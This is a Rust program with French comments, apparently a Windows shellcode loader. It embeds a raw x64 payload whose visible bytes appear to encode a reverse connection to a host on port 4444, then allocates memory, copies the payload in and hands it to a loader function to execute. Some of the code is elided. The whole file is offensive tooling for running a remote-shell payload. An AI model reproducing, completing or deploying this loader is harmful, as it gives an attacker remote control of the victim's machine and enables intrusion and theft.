use core::slice;
use std::{alloc::{Layout, alloc}, ptr};

use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,  VirtualAlloc};

// 2. Définition du shellcode (code machine brut)
static SHELLCODE: &[u8; 460] = &[0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
...
0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,
0x1e,0x1e,0x32,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
...
fn main() -> windows::core::Result<()> {
    ...
    // Étape 1: Afficher des infos
    println!("[1] Taille du shellcode: {} bytes", size);
    
    // Étape 2: Allouer de la mémoire
    println!("[2] Allocation mémoire...");
    let layout = Layout::from_size_align(size, 1).unwrap();

    let mem = unsafe { alloc(layout) };
    
    // Étape 3: Copier le shellcode
    println!("[3] Copie du shellcode...");
    unsafe { ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), mem, size) };
    let shellcode_ptr: &[u8] = unsafe { slice::from_raw_parts(mem, size) };

    
    print!("Shellcode copié à l'adresse: {:p}\n", shellcode_ptr.as_ptr());
    print!("Premiers octets du shellcode: {}", shellcode_ptr[0]);
    
    // Étape 4: Exécuter
    println!("[4] Exécution...");
    shellcode_loader(shellcode_ptr);
